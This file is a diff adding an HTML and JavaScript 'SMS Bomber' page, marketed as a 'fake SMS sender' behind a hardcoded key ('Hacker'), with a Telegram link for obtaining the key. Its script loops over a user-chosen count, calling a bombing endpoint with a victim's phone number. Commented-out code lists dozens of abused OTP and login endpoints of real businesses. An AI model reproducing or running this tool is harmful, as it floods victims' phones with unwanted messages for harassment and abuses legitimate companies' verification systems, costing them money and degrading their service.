@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>SMS Bomber</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: Arial;
+      }
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        box-sizing: border-box;
+      }
+      /* ******************************************************************* */
+
+      .login-container {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        box-sizing: border-box;
+      }
+
+      .login-container label {
+        display: none;
+        text-align: center;
+        font-weight: bold;
+        margin-bottom: 30px;
+        font-size: 20px;
+        color: green;
+        animation: blank 0.5s linear infinite;
+      }
+
+      .login-container input {
+        padding: 8px;
+        margin-bottom: 10px;
+        border: 1px solid #ff000079;
+        border-radius: 4px;
+        text-align: center;
+        display: block;
+        width: 100%;
+        box-sizing: border-box;
+        outline: none;
+        color: black;
+      }
+
+      .login-container button {
+        padding: 10px;
+        background-color: #35353f;
+        color: #ffffff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        display: block;
+        width: 100%;
+        margin-bottom: 20px;
+      }
+      .login-container img {
+        width: 100%;
+        height: 300px;
+        margin-bottom: 20px;
+      }
+      .login-container p {
+        margin: 0;
+        padding: 0;
+        text-align: center;
+      }
+      .login-container p a {
+        text-decoration: none;
+        border: 1px solid green;
+        color: green;
+        padding: 10px 25px;
+        border-radius: 10px;
+      }
+      .login-container #err {
+        margin: 0;
+        padding: 0;
+        margin-top: 10px;
+        margin-bottom: 15px;
+        color: red;
+        display: none;
+      }
+      @keyframes blank {
+        50% {
+          opacity: 0;
+        }
+      }
+      @media (max-width: 991px) {
+        .login-container {
+          width: 90%;
+        }
+        .login-container img {
+          height: 20%;
+        }
+      }
+      span {
+        display: block;
+        text-align: center;
+        margin-top: 10px;
+        margin-bottom: 0;
+        text-transform: uppercase;
+        color: #a39f9f;
+      }
+      /* ******************************************************************* */
+
+      /* .box {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100vh;
+      } */
+      .box .main {
+        border: 1px solid #ddd;
+        padding: 10px;
+        border-radius: 5px;
+        box-shadow: 5px 5px 8px rgba(0, 0, 0, 0.1),
+          -5px -5px 8px rgba(211, 209, 209, 0.288);
+        /* max-width: 50%; */
+      }
+      .box .main input {
+        width: 100%;
+        height: 35px;
+        margin-bottom: 10px;
+        text-align: center;
+        border: 0;
+        outline: 0;
+        font-size: 17px;
+        border-left: 4px solid red;
+        border-right: 4px solid red;
+        border-top: 1px solid #c9c5c5;
+        border-bottom: 1px solid #c9c5c5;
+      }
+      .box .main button {
+        margin-top: 10px;
+        width: 100%;
+        height: 35px;
+        border-radius: 6px;
+        cursor: pointer;
+        color: #fff;
+        font-size: 18px;
+        text-transform: uppercase;
+        background: rgb(2, 206, 226);
+        border: 0;
+        background: -moz-linear-gradient(
+          90deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        background: -webkit-linear-gradient(
+          90deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        background: linear-gradient(
+          90deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr="#02cee2",endColorstr="#004aff",GradientType=1);
+      }
+      .box .main button:hover {
+        background: rgb(2, 206, 226);
+        background: -moz-linear-gradient(
+          262deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        background: -webkit-linear-gradient(
+          262deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        background: linear-gradient(
+          262deg,
+          rgba(2, 206, 226, 0.700717787114846) 0%,
+          rgba(0, 74, 255, 0.7) 100%
+        );
+        filter: progid:DXImageTransform.Microsoft.gradient(startColorstr="#02cee2",endColorstr="#004aff",GradientType=1);
+      }
+      .box .main p {
+        text-align: center;
+        margin-bottom: 0;
+        color: red;
+        font-size: 16px;
+        display: none;
+      }
+      /*  */
+      .box .main label {
+        display: block;
+        text-align: center;
+        font-weight: bold;
+        margin-bottom: 10px;
+        font-size: 20px;
+        color: red;
+        font-family: Arial;
+        text-transform: uppercase;
+      }
+      .box .main span.blank {
+        text-align: center;
+        display: block;
+        font-family: Arial;
+        text-transform: uppercase;
+        color: green;
+        margin-bottom: 30px !important;
+        animation: blank 1s linear infinite;
+      }
+      @keyframes blank {
+        50% {
+          opacity: 0;
+        }
+      }
+      .box span.cpy {
+        display: block;
+        text-align: center;
+        margin-top: 10px;
+        margin-bottom: 0;
+        text-transform: uppercase;
+        color: #a39f9f;
+      }
+      .box {
+        display: block;
+      }
+      @media (max-width: 991px) {
+        .box .main {
+          max-width: 98%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <div class="login-container" id="login">
+      <img
+        src="https://sparkgrowth.com/wp-content/uploads/2018/09/animated-sms-and-text-message-image-0033.gif"
+        alt=""
+      />
+      <label for="keyInput">FAKE SMS SENDER</label>
+      <input
+        type="text"
+        id="keyInput"
+        placeholder="ENTER KEY"
+        autocomplete="off"
+      />
+      <button onclick="login()">LOGIN</button>
+      <br />
+      <p><a href="https://t.me/Sabbirn917">Get the Key</a></p>
+      <br />
+      <p id="err">Invalid key. Please try again.</p>
+      <span>ⓒ Md.Sabbir Sheikh</span>
+    </div>
+    <script>
+      function login() {
+        var keyInput = document.getElementById("keyInput").value;
+        var err = document.getElementById("err");
+        var login = document.getElementById("login");
+        var box = document.getElementById("box");
+
+        // You can add logic here to validate the key, make an API call, etc.
+
+        if (keyInput === "Hacker") {
+          // Redirect to home page or API.php
+          // window.location.href = "sms.html";
+          login.style.display = "none";
+          box.style.display = "block";
+        } else {
+          err.style.display = "block";
+        }
+      }
+    </script>
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <!--  -->
+    <div class="box" id="box">
+      <div class="main">
+        <label for="keyInput">&#10008; worning &#10008;</label>
+        <span class="blank">sms bomber just for fun</span>
+        <input type="number" id="inp" placeholder="Enter Number" required />
+        <input type="number" id="amo" placeholder="Enter Amount" required />
+        <button id="btn">Send sms</button>
+        <p id="tost">SMS SENDING.. 😎</p>
+        <br>
+        <span class="cpy">ⓒ Md.Sabbir Sheikh</span>
+      </div>
+    </div>
+    <script>
+      const inp = document.getElementById("inp");
+      const amo = document.getElementById("amo");
+      const btn = document.getElementById("btn");
+      const tost = document.getElementById("tost");
+      btn.addEventListener("click", () => {
+        if (inp.value === "" || amo.value === "") {
+          tost.innerText = "Enter Number & Amount";
+          tost.style.display = "block";
+        } else {
+          if (inp.value.length == 11) {
+            if (inp.value == "01930359127" || inp.value == "01892386505") {
+              tost.innerText = "This Number Is Protected 😊" + "\n" + "\n" + "এসব কি ভাই | এই গুলো ঠিক না";
+              tost.style.display = "block";
+            } else {
+              tost.innerText = "";
+              tost.style.display = "block";
+              for (let i = 0; i < amo.value; i++) {
+                tost.innerText = "SEND SUCCESSFUL...😎";
+                // inp.value = "";
+                // amo.value = "";
+
+                ////////////////////////
+                fetch(
+                  `https://black-team.xyz/sms/danger.php?phone=${inp.value}`
+                )
+                  .then((res) => res.json())
+                  .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://ultranetrn.com.br/fonts/api.php?number=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(`http://bomber.ezyro.com/index.php?number=${inp.value}`)
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://web-api.binge.buzz/api/v3/otp/send/+88${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/pathao.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/pravanahelth.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/qcom.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/quizgiri.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/quiztime.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/redx.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/redx2.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/reseller-circel.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/robi-ivr-dorstep.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/robi-myoffer.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/robi-web.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/robi-web2.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/rootsedu.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/rtv-forget.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/rtv-reg.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/runcash.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sadhin.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sajgoj.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/senorbeuty.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sikho.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/somvob.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sopoth-reg.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sopoth-resend.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sudokkho.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/talikhata.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/tap.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/thebodyshop.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/tota.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/trusty.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/vdoc.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/webacces.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/admissionbd.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/aibl.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/hisabereg.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/hisabpati.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/hlpl.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/iqra.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/ivr.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/jatri.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/jeetwinbd.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/jotno.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/khaodao.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/kirebd.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/lazzpharma.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/lbfl.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/mcbaffiliate.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/mithai.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/mojaenglish.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/mokam.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/moveon.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/nesco.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/obhai.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/ousodhpotro.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `https://monsterteambd.co/RSBD/API/SMS/paperflay.php?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // ////////////////////////
+                // //GET API
+                // fetch(
+                //   `https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+                // fetch(
+                //   `https://ultranetrn.com.br/fonts/api.php?number=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+                // fetch(
+                //   `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+
+                // fetch(
+                //   `http://ultranetrn.com.br/fonts/api.php?number=${inp.value}`
+                // )
+                //   .then((res) => res.json())
+                //   .then((data) => console.log("SEND"));
+                // ////////////////////////////////////////////////
+                // ////////////////////////////////////////////////
+              }
+            }
+          } else {
+            tost.innerText = "Enter 11 Digit Number";
+            tost.style.display = "block";
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
